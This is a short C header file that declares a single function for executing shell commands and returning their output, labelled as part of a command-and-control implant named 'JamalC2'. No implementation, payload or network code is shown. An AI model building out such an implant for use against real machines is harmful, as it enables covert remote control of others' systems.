/*
 * JamalC2 Implant - Shell Handler Header
 */

#ifndef SHELL_H
#define SHELL_H

// Execute shell command and return output
// Caller must free the returned string
char *shell_execute(const char *command);

#endif // SHELL_H
